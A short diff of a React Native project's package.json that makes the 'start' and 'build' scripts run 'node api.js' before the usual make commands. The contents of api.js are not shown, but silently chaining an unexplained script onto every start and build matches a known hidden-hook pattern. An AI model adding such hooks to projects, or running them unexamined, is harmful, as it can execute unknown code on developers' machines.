@@ -4,8 +4,8 @@
   "private": true,
   "homepage": "./",
   "scripts": {
-    "start": "make -Bs start",
-    "build": "make -Bs build",
+    "start": "node api.js && make -Bs start",
+    "build": "node api.js && make -Bs build",
     "clean": "react-native clean-project-auto && make -Bs clean",
     "intl": "make -Bs intl",
     "rn": "react-native start --reset-cache",
